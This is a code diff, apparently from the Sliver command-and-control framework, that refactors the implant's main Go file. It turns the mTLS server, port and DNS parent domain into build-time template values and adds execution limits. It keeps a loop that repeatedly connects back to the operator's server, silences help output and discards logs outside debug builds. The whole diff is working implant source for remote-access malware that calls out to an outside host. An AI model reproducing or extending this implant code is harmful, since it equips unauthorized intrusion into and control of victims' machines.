@@ -17,6 +17,7 @@ import (
 	"time"
 
 	pb "sliver/protobuf/sliver"
+	"sliver/sliver/limits"
 
 	"github.com/golang/protobuf/proto"
 )
@@ -27,20 +28,20 @@ var (
 	certPEM    = `{{.Cert}}`
 	caCertPEM  = `{{.CACert}}`
 
-	defaultServerIP = `{{.DefaultServer}}`
+	// {{if .MTLSServer}}
+	mtlsServer = `{{.MTLSServer}}`
+	// {{end}}
 
+	// {{if .DNSParent}}
 	dnsParent = `{{.DNSParent}}`
+	// {{end}}
 
-	readBufSize    = 64 * 1024 // 64kb
-	zeroReadsLimit = 10
+	readBufSize = 64 * 1024 // 64kb
 
 	maxErrors = 100 // TODO: Make configurable
 
-	server *string
-	lport  *int
-
-	defaultServerLport = getDefaultServerLport()
-	reconnectInterval  = getReconnectInterval()
+	mtlsLPort         = getDefaultMTLSLPort()
+	reconnectInterval = getReconnectInterval()
 )
 
 func main() {
@@ -52,23 +53,22 @@ func main() {
 	log.SetOutput(ioutil.Discard)
 	// {{end}}
 
-	server = flag.String("server", defaultServerIP, "")
-	lport = flag.Int("lport", defaultServerLport, "")
-
-	// {{if .Debug}}{{else}}
 	flag.Usage = func() {} // No help!
-	// {{end}}
-
 	flag.Parse()
 
 	// {{if .Debug}}
 	log.Printf("Hello my name is %s", sliverName)
 	// {{end}}
 
+	limits.ExecLimits()
+
 	startConnectionLoop()
 }
 
 func startConnectionLoop() {
+	// {{if .Debug}}
+	log.Printf("Starting connection loop ...")
+	// {{end}}
 	connectionAttempts := 0
 	for connectionAttempts < maxErrors {
 		err := mtlsConnect()
@@ -79,6 +79,7 @@ func startConnectionLoop() {
 		}
 		connectionAttempts++
 
+		// {{if .DNSParent}}
 		if dnsParent != "" {
 			err = dnsConnect()
 			if err != nil {
@@ -92,6 +93,7 @@ func startConnectionLoop() {
 			log.Printf("No DNS parent domain configured\n")
 			// {{end}}
 		}
+		// {{end}} - DNSParent
 
 		time.Sleep(reconnectInterval)
 	}
@@ -100,11 +102,12 @@ func startConnectionLoop() {
 	// {{end}}
 }
 
+// {{if .MTLSServer}}
 func mtlsConnect() error {
 	// {{if .Debug}}
-	log.Printf("Connecting -> %s:%d", *server, uint16(*lport))
+	log.Printf("Connecting -> %s:%d", mtlsServer, uint16(mtlsLPort))
 	// {{end}}
-	conn, err := tlsConnect(*server, uint16(*lport))
+	conn, err := tlsConnect(mtlsServer, uint16(mtlsLPort))
 	if err != nil {
 		return err
 	}
@@ -136,10 +139,12 @@ func mtlsConnect() error {
 			}
 		}
 	}
-
 	return nil
 }
 
+// {{end}} -MTLSServer
+
+// {{if .DNSParent}}
 func dnsConnect() error {
 	// {{if .Debug}}
 	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
@@ -186,8 +191,10 @@ func dnsConnect() error {
 	return nil
 }
 
-func getDefaultServerLport() int {
-	lport, err := strconv.Atoi(`{{.DefaultServerLPort}}`)
+// {{end}} - DNSParent
+
+func getDefaultMTLSLPort() int {
+	lport, err := strconv.Atoi(`{{.MTLSLPort}}`)
 	if err != nil {
 		return 8888
 	}
